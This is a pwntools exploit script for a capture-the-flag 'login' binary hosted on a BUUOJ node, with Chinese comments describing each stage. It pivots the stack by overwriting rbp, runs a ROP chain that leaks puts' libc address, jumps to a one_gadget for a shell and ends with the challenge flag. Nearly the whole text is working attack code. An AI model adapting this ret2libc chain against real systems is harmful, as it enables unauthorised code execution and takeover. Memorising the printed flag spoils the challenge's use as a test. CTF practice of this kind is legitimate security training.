from pwn import *

# v40 = "A7A5577A292F2321"  # 21232F297A57A5A7
# v41 = "C31F804A0E4A8943"  # 43894A0E4A801FC3
# "21232F297A57A5A743894A0E4A801FC3"

# one_gadget = 0x45226 # 0x4527a 0xf03a4 0xf1247
context.log_level = "DEBUG"

context.binary = './login'
sh = process("./login")  # , env={'LD_PRELOAD': './libc.so.6'}
# process(['ld.so','pwn'],env=xxx)
sh = remote("node3.buuoj.cn", 27490)
libc = ELF("./libc.so.6")
elf = ELF("./login")
# gdb.attach(sh, "b *(0x401972)\nb *(0x40191C)\nc")

# ===== step-1 控制rbp 进而控制rsp rip, 跳转回主要逻辑所在的函数 call 0x4018C7 的地址 0x4018BF
# 用前面的地址0x4018BF是为了让buf name地址差0x20（调试可得）多一个call = 多一个push
payload = b"admin\0".ljust(0x8, b'\0') + p64(0x4018BF)  # name 输入限制0x20
sh.sendafter(">", payload)
payload = b"admin\0".ljust(0x20, b'\0') + p64(0x602400)  # pw 输入限制0x28 # 修改rbp的值 第二次leave修改rsp的值
sh.sendafter(">", payload)

# buf/rsp 0x6023e0  +0x20 = s1 name 602400 # name + 8为返回地址
# ===== step-2 构造ROP 泄露puts真实地址 得到libc基址 并返回到main_logic里再执行一次
# payload: p64(pop rdi, ret) p64(puts@got) p64(0x4018B5) # 0x4018B5
# 如果buf偏移量并非+0x20=name, 则buf写入后不做操作可能会把name覆盖掉 导致判断时Oh no
# 0x401ab3 : pop rdi ; ret
payload = b"admin\0".ljust(0x8, b'\0') + p64(0x401ab3) + p64(elf.got['puts']) + p64(0x4018B5)
sh.sendafter(">", payload)
payload = b"admin\0".ljust(0x8, b'\0')
sh.sendafter(">", payload)

data = sh.recvuntil("GeBai\n")
addr_puts = u64(sh.recvline(keepends=False).ljust(8, b'\0'))
print("addr_puts=", hex(addr_puts))
libc.address = addr_puts - libc.sym['puts']
print("libc.address =", hex(libc.address))

# ===== step-3 ret to one_gadget RA可控原因：name可控区域包含返回地址
payload = b"admin\0".ljust(0x18, b'\0') + p64(libc.address + 0xf1247)  # gdb调试 让地址放在RA处
# 具体用哪一个one_gadget不清楚 远程蒙的 0xf1247蒙对了 可用
sh.sendafter(">", payload)
payload = b"admin\0".ljust(0x8, b'\0')
sh.sendafter(">", payload)


sh.interactive()  # then cat flag.txt at server
# flag{9c2090bf-8a0b-4785-9577-c34f070903a4}
